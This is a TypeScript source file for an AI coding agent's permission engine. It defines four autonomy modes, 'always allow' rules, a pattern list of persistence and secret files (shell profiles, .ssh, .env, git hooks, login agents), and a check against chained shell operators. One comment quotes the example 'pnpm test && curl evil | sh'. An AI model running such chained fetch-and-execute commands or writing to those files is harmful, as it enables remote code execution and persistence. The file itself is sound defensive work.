/**
 * Permission engine — the 4 play modes.
 *
 * Reading    : the agent reads and replies, no writes and no commands;
 *              anything that leaves the machine asks.
 * Rehearsal  : anything that touches the system or leaves it asks (default).
 * Quill      : the agent holds the pen — automatic edits and web lookups,
 *              but commands ask.
 * Improv     : anything goes.
 *
 * The mode is a CEILING: a remembered rule can turn an "ask" into an
 * "allow", but it can never lift a denial coming from the mode.
 */

import { bonaparteDataDir } from '../paths.js';
import type { ToolEffect } from '../tools/types.js';

export type PlayMode = 'lecture' | 'repetition' | 'plume' | 'impro';

export const PLAY_MODES: readonly PlayMode[] = [
  'lecture',
  'repetition',
  'plume',
  'impro',
];

export type PermissionDecision = 'allow' | 'ask' | 'deny';

/** Remembered rule for a project ("always allow this"). */
export interface AllowRule {
  tool: string;
  /** For execution tools: allowed command prefix (a program name — its commands, never a second one). */
  commandPrefix?: string;
  /** For execution tools: this exact command line, nothing more (surrounding spaces aside). */
  exactCommand?: string;
}

/** What an "always allow" covers: this very command, or every command of its program. */
export type AlwaysScope = 'command' | 'binary';

/**
 * The program a command runs, when it is a plain name that can safely
 * become a prefix rule — `git`, `pnpm`, `npx`. An environment assignment,
 * a substitution or any shell operator in the first word: undefined.
 */
export function commandBinary(command: string): string | undefined {
  const first = command.trim().split(/\s+/)[0] ?? '';
  // A name or a forward-slash path; a Windows path falls back to the exact line.
  return /^\w[\w.\-/:]*$/.test(first) ? first : undefined;
}

/**
 * The rule an "always allow" remembers (Q-24, audit C1): the exact line
 * for "this command", the program for "every command of it" — and the
 * exact line again when the program is not a plain name. A tool with no
 * command is allowed as a whole.
 */
export function alwaysRule(tool: string, command: string | undefined, scope: AlwaysScope): AllowRule {
  if (command === undefined) return { tool };
  const binary = scope === 'binary' ? commandBinary(command) : undefined;
  return binary ? { tool, commandPrefix: binary } : { tool, exactCommand: command.trim() };
}

export interface PermissionQuery {
  tool: string;
  effect: ToolEffect;
  /** Full command, for execution tools. */
  command?: string;
  /** Target path, for file tools — an "armed" file asks even when writes do not. */
  path?: string;
}

/**
 * Files whose content RUNS later — git hooks, npm scripts, tool configs,
 * editor tasks, CI workflows, make targets — or holds secrets (Q-25, audit
 * C6). Quill lets the agent write without asking, but a write here is a
 * deferred command: it asks, like one. Matched on the path's shape.
 */
const ARMED: RegExp[] = [
  /(^|\/)\.git(\/|$)/,
  /(^|\/)\.husky\//,
  /(^|\/)\.vscode\//,
  /(^|\/)\.github\/workflows\//,
  /(^|\/)package\.json$/,
  /(^|\/)\.npmrc$/,
  /(^|\/)\.yarnrc(\.yml)?$/,
  /(^|\/)[^/]+\.config\.(js|cjs|mjs|ts|cts|mts)$/,
  /(^|\/)makefile$/,
  /(^|\/)\.env(\.[^/]*)?$/,
  // Beyond a project — reachable when there is none, whose perimeter is the
  // home folder (adversarial review, 2026-09-26): what the system runs at
  // login, what a shell runs when it starts, who may log in by key.
  /(^|\/)start menu\/programs\/startup\//,
  /(^|\/)(windows)?powershell\/[^/]*profile\.ps1$/,
  /(^|\/)\.(bashrc|bash_profile|bash_login|profile|zshrc|zprofile|zshenv|zlogin)$/,
  /(^|\/)\.config\/fish\/config\.fish$/,
  /(^|\/)\.config\/autostart\//,
  /(^|\/)library\/launchagents\//,
  /(^|\/)\.ssh\//,
  /(^|\/)\.gitconfig$/,
];

export function isArmedPath(path: string): boolean {
  const normalized = normalize(path);
  if (ARMED.some((pattern) => pattern.test(normalized))) return true;
  // bonaparte's own data: its config, its grants, its MCP servers — each
  // one a command run later, with bonaparte's rights.
  const data = normalize(bonaparteDataDir()).replace(/\/+$/, '');
  return normalized === data || normalized.startsWith(`${data}/`);
}

function normalize(path: string): string {
  return path.replace(/\\/g, '/').toLowerCase();
}

export class PermissionEngine {
  /**
   * `rules`: a fixed list, or a provider read on every evaluation — the
   * host answers with the grants of the project whose turn is running.
   * `remember`/`forget` edit a fixed list only.
   */
  constructor(
    private mode: PlayMode = 'repetition',
    private rules: AllowRule[] | (() => AllowRule[]) = [],
  ) {}

  private currentRules(): AllowRule[] {
    return typeof this.rules === 'function' ? this.rules() : this.rules;
  }

  getMode(): PlayMode {
    return this.mode;
  }

  setMode(mode: PlayMode): void {
    this.mode = mode;
  }

  listRules(): AllowRule[] {
    return this.currentRules().map((rule) => ({ ...rule }));
  }

  remember(rule: AllowRule): void {
    const rules = this.currentRules();
    if (typeof this.rules === 'function') throw new Error('Rules come from a provider: remember them there.');
    if (!rules.some((existing) => sameRule(existing, rule))) {
      this.rules = [...rules, { ...rule }];
    }
  }

  forget(rule: AllowRule): void {
    if (typeof this.rules === 'function') throw new Error('Rules come from a provider: forget them there.');
    this.rules = this.rules.filter((existing) => !sameRule(existing, rule));
  }

  evaluate(query: PermissionQuery): PermissionDecision {
    const ceiling = MODE_MATRIX[this.mode][query.effect];
    // A write to an armed file is a deferred command: it asks in Quill,
    // and no tool-wide grant answers for it. Improv still allows it,
    // Reading still denies it.
    if (query.effect === 'write' && query.path !== undefined && isArmedPath(query.path)) {
      return ceiling === 'deny' || this.mode === 'impro' ? ceiling : 'ask';
    }
    // The mode is a ceiling: a rule can only loosen an "ask".
    if (ceiling !== 'ask') return ceiling;
    return this.currentRules().some((rule) => matches(rule, query)) ? 'allow' : 'ask';
  }
}

const MODE_MATRIX: Record<PlayMode, Record<ToolEffect, PermissionDecision>> = {
  lecture: { read: 'allow', write: 'deny', execute: 'deny', network: 'ask' },
  repetition: { read: 'allow', write: 'ask', execute: 'ask', network: 'ask' },
  plume: { read: 'allow', write: 'allow', execute: 'ask', network: 'allow' },
  impro: { read: 'allow', write: 'allow', execute: 'allow', network: 'allow' },
};

function sameRule(a: AllowRule, b: AllowRule): boolean {
  return a.tool === b.tool && a.commandPrefix === b.commandPrefix && a.exactCommand === b.exactCommand;
}

function matches(rule: AllowRule, query: PermissionQuery): boolean {
  if (rule.tool !== query.tool) return false;
  if (rule.exactCommand !== undefined) return (query.command ?? '').trim() === rule.exactCommand;
  if (rule.commandPrefix === undefined) return true;
  const command = query.command ?? '';
  if (!command.startsWith(rule.commandPrefix)) return false;
  // Word boundary: "pnpm test" must not authorize "pnpm testament".
  const next = command.charAt(rule.commandPrefix.length);
  if (next !== '' && !/\s/.test(next)) return false;
  // A shell operator after the prefix starts ANOTHER command: "pnpm test &&
  // curl evil | sh" begins with the prefix and has a space next, and every
  // operator behind a space was authorised (audit, 2026-08-28). The rule
  // covers arguments, never a second command, a pipe, a redirection or a
  // substitution.
  return !SHELL_OPERATOR.test(command.slice(rule.commandPrefix.length));
}

/** What turns "the same command with arguments" into something else: ; & | < > $ ` and a line break. */
const SHELL_OPERATOR = /[;&|<>$`\n]/;
